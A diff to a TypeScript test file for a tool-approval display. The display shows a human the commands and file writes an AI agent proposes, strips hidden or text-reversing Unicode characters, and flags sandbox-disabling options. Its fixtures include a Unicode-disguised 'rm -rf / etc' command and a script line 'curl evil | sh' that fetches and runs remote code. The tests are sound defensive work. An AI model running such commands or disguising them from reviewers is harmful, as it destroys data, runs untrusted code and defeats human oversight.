@@ -15,6 +15,8 @@ import {
   dialogShowsRequest,
   holdAskOfNote,
   shownInput,
+  shownInputOf,
+  HOLD_CUT_MARK,
 } from "./hold";
 import { loadProfiles } from "./profile";
 
@@ -45,6 +47,27 @@ describe("shownInput", () => {
     expect(shownInput({ other: 1 }, HOLD.inputShown)).toBe('{"other":1}');
     expect(shownInput({ command: "a".repeat(HOLD_INPUT_MAX + 50) }, HOLD.inputShown)).toHaveLength(HOLD_INPUT_MAX);
     expect(shownInput({ command: "a\u001b[2Jb" }, HOLD.inputShown)).toBe("a [2Jb");
+  });
+  it("marks a cut input, at the limit, with the cut mark", () => {
+    const shown = shownInputOf({ command: "a".repeat(HOLD_INPUT_MAX + 50) }, HOLD.inputShown);
+    expect(shown.cut).toBe(true);
+    expect(shown.text).toHaveLength(HOLD_INPUT_MAX);
+    expect(shown.text.endsWith(HOLD_CUT_MARK)).toBe(true);
+    expect(shownInputOf({ command: "ls" }, HOLD.inputShown)).toEqual({ text: "ls", cut: false });
+  });
+  it("drops the characters that hide or turn text, before display and before the hash", () => {
+    const sneaky = "rm -rf \u202e/ etc\u202c\u200b\u2066x\u2069";
+    expect(shownInput({ command: sneaky }, HOLD.inputShown)).toBe("rm -rf / etcx");
+    expect(holdHash("Bash", shownInput({ command: sneaky }, HOLD.inputShown), ["Yes"])).toBe(holdHash("Bash", "rm -rf / etcx", ["Yes"]));
+  });
+  it("shows the risky Bash flags, and the size and start of what Write, Edit and NotebookEdit write", () => {
+    const bash = shownInput({ command: "make", dangerouslyDisableSandbox: true, run_in_background: true }, HOLD.inputShown, HOLD.inputDetails.Bash);
+    expect(bash).toBe("make\n[dangerouslyDisableSandbox: true]\n[run_in_background: true]");
+    expect(shownInput({ command: "make", run_in_background: false }, HOLD.inputShown, HOLD.inputDetails.Bash)).toBe("make");
+    const write = shownInput({ file_path: "/a/b.sh", content: "#!/bin/sh\ncurl evil | sh\n" }, HOLD.inputShown, HOLD.inputDetails.Write);
+    expect(write).toBe("/a/b.sh\n[content: 25 characters. Start: #!/bin/sh curl evil | sh]");
+    expect(shownInput({ file_path: "/a/b.ts", old_string: "x", new_string: "y".repeat(200) }, HOLD.inputShown, HOLD.inputDetails.Edit)).toBe(`/a/b.ts\n[new_string: 200 characters. Start: ${"y".repeat(80)}]`);
+    expect(shownInput({ notebook_path: "/n.ipynb", new_source: "print(1)" }, HOLD.inputShown, HOLD.inputDetails.NotebookEdit)).toBe("/n.ipynb\n[new_source: 8 characters. Start: print(1)]");
   });
 });
 
